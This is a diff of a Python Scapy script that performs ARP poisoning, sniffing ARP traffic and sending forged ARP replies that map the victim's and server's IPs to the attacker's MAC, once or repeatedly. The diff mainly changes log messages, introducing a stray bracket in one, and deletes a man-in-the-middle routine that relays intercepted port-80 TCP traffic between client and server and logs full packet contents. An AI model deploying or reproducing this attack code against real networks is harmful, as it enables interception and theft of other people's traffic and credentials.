@@ -68,7 +68,7 @@ def arp_poisoning(victim_ip, server_ip, mode):
 
     try:
         if victim_ip and not server_ip:
-            print("[*] Waiting for ARP from victim to discover server IP...")
+            print("Waiting for ARP from victim to discover server IP...")
             pkt = sc.sniff(filter="arp", iface=iface, store=1,
                            stop_filter=lambda p: p.haslayer(sc.ARP) and p[sc.ARP].psrc == victim_ip)[0]
             server_ip = pkt[sc.ARP].pdst
@@ -76,7 +76,7 @@ def arp_poisoning(victim_ip, server_ip, mode):
             server_mac = get_mac(server_ip)
 
         elif not victim_ip and not server_ip:
-            print("[*] Waiting for any ARP broadcast to discover both IPs...")
+            print("[Waiting for any ARP broadcast to discover both IPs...")
             pkt = sc.sniff(filter="arp", iface=iface, store=1,
                            stop_filter=lambda p: p.haslayer(sc.ARP) and p[sc.ARP].op == 1)[0]
             victim_ip = pkt[sc.ARP].psrc
@@ -87,6 +87,7 @@ def arp_poisoning(victim_ip, server_ip, mode):
         else:
             victim_mac = get_mac(victim_ip)
             server_mac = get_mac(server_ip)
+            print("Waiting for ARP broadcast from victim")
             pkt = sc.sniff(filter="arp", iface=iface, store=1,
                            stop_filter=lambda p: p.haslayer(sc.ARP) and p[sc.ARP].psrc == victim_ip and p[sc.ARP].pdst == server_ip)[0]
 
@@ -99,10 +100,10 @@ def arp_poisoning(victim_ip, server_ip, mode):
         fake_packet_server = sc.ARP(op=2, pdst=server_ip, psrc=victim_ip, hwsrc=attacker_mac)
 
         if mode == "silent":
-            print("[*] Silent mode: sending one-time ARP poison")
+            print("Silent mode: sending one-time ARP poison")
             sc.sendp(fake_packet_victim, iface=iface, verbose=False)
         else:
-            print("[*] Active mode: sending ARP poison repeatedly")
+            print("Allout mode: sending ARP poison repeatedly")
             for i in range(5):
                 sc.sendp(fake_packet_victim, iface=iface, verbose=False)
                 print(f"  [>] Poisoning round {i+1}")
@@ -130,73 +131,3 @@ def check_arp_client(pkt,client_ip):
         if arp.op == 1 and arp.psrc == client_ip:
             return True
     return False
-
-
-## forwarding method
-
-def own_server(clientIP, serverIP, attackerIP):
-    while True:
-        pkt = sc.sniff(
-            filter="tcp port 80",
-            iface=sc.conf.iface,
-            store=True,
-            count=1,
-            lfilter=lambda p: p.haslayer(sc.IP) and p.haslayer(sc.TCP)
-        )[0]
-        log_packet(pkt)
-
-        if pkt[sc.IP].src == clientIP:
-            # Forward client packet to the attacker-chosen server
-            forward_to_server(pkt, attackerIP, serverIP)
-            if is_rst(pkt) or is_tcp_fin(pkt):
-                return
-
-        elif pkt[sc.IP].src == serverIP:
-            # Forward response from attacker-chosen server back to client
-            forward_to_client(pkt, attackerIP, clientIP)
-            if is_rst(pkt) or is_tcp_fin(pkt):
-                return
-
-
-def forward_to_server(pkt, attackerIP, serverIP):
-    ip = sc.IP(src=attackerIP, dst=serverIP)
-    tcp = sc.TCP(
-        sport=pkt[sc.TCP].sport,
-        dport=pkt[sc.TCP].dport,
-        seq=pkt[sc.TCP].seq,
-        ack=pkt[sc.TCP].ack,
-        flags=pkt[sc.TCP].flags
-    )
-    new_pkt = ip / tcp
-    if pkt.haslayer(sc.Raw):
-        new_pkt = new_pkt / sc.Raw(load=pkt[sc.Raw].load)
-    sc.send(new_pkt, iface=sc.conf.iface, verbose=False)
-
-
-def forward_to_client(pkt, attackerIP, clientIP):
-    ip = sc.IP(src=attackerIP, dst=clientIP)
-    tcp = sc.TCP(
-        sport=pkt[sc.TCP].sport,
-        dport=pkt[sc.TCP].dport,
-        seq=pkt[sc.TCP].seq,
-        ack=pkt[sc.TCP].ack,
-        flags=pkt[sc.TCP].flags
-    )
-    new_pkt = ip / tcp
-    if pkt.haslayer(sc.Raw):
-        new_pkt = new_pkt / sc.Raw(load=pkt[sc.Raw].load)
-    sc.send(new_pkt, iface=sc.conf.iface, verbose=False)
-
-
-def is_rst(pkt):
-    return sc.TCP in pkt and 'R' in pkt[sc.TCP].flags
-
-def is_tcp_fin(pkt):
-    return sc.TCP in pkt and 'F' in pkt[sc.TCP].flags
-
-def log_packet(pkt, filename="packet_log.txt"):
-    with open(filename, "a") as f:
-        f.write("=== Packet Captured ===\n")
-        f.write(pkt.summary() + "\n") 
-        f.write(str(pkt.show(dump=True))) 
-        f.write("\n=======================\n\n")
